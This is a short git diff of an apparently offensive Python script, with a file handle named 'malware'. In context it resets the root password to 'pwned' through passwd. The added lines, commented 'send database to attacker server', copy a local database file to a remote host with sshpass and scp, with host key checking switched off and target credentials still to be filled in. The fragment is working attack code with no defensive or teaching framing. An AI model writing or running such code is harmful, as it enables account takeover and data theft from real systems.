@@ -6,4 +6,10 @@ malware.write("<!DOCTYPE html><html><head><title>foobar</title><style>h1 {text-a
 
 #change-cred
 subprocess.run('echo -n "pwned\npwned" | passwd root', shell=True)
-os.system("sshpass -p PW scp -o StrictHostKeyChecking=no ../Web2-Projekt/immobilie.db host@IP:/home/user ")
+
+#send database to attacker server
+## WIP
+#TargetIP = input("Target IP :")
+#TargetUser = input("Target User: ")
+#PW = input("Target PW :")
+os.system("sshpass -p PW scp -o StrictHostKeyChecking=no ../Web2-Projekt/immobilie.db TargetUser@TargetIP:/home/user ")
